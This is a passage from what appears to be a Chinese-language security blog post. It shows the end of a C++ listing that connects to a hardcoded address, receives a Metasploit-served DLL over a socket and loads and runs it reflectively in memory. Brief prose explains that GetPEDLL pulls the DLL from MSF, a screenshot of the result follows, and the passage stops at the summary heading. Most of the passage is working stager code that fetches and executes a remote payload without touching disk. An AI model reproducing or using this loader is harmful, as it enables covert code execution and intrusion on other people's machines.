+</span></span><span style="display:flex;"><span>	sin.sin_port <span style="color:#f92672">=</span> htons(sListenPort);
+</span></span><span style="display:flex;"><span>	sin.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.138&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(connect(socks,(<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin,<span style="color:#66d9ef">sizeof</span>(sin)) <span style="color:#f92672">==</span> SOCKET_ERROR )
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		dwError <span style="color:#f92672">=</span> GetLastError();
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[*]Bind Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">2650</span>,NULL);
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ZeroMemory(bFileBuffer,PAYLOAD_SIZE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">5120</span>,NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		closesocket(socks);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>} 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 打开文件并获取大小
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
+</span></span><span style="display:flex;"><span>	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 打开文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> dwLowFileSize;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	HMEMORYMODULE hModule;
+</span></span><span style="display:flex;"><span>	Module DllMain;
+</span></span><span style="display:flex;"><span>	bFileBuffer <span style="color:#f92672">=</span> new BYTE[PAYLOAD_SIZE];
+</span></span><span style="display:flex;"><span>	GetPEDLL();
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 导入PE文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果加载失败，就退出
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>		delete [] bFileBuffer;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 获取msg导出函数地址
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DllMain <span style="color:#f92672">=</span> (Module)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;DllMain&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 运行msg函数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DllMain(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放资源
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwThread;
+</span></span><span style="display:flex;"><span>	HANDLE hThread <span style="color:#f92672">=</span> CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)DllMain,NULL,NULL,<span style="color:#f92672">&amp;</span>dwThread);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	WaitForSingleObject(hThread,INFINITE);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	MemoryFreeLibrary(hModule);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放PE内存
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	delete [] bFileBuffer;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>
 <p>实现效果如下：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/82f319d8-4f5f-11ec-a688-00d861bf4abb.png" alt="2020-01-03-13-07-19"></p>
 <h2 id="0x04-总结">0x04 总结</h2>
